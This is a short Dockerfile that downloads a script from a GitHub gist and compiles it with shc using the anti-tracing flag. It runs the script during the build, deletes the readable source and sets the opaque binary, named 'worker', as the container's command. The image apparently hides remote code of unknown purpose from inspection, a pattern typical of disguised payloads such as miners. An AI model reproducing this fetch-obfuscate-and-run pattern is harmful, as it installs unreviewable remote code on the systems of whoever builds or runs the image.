FROM alpine:edge

ENV SHURL https://gist.githubusercontent.com/lindingchan/846a44d22b3ed11d13dd2f5eb6d44dd6/raw/f0ef5b85d085dfac67b267270bb8ab3f39ec876c/gistfile1.txt

RUN echo "http://dl-cdn.alpinelinux.org/alpine/edge/testing" >> /etc/apk/repositories && apk update && apk add --no-cache gcc musl-dev shc && \
    wget $SHURL -O /worker && shc -r -B -f /worker && /worker.x && \
    apk del gcc musl-dev shc && rm -rf /worker /worker.x.c /var/cache/apk/*
    
CMD /worker.x
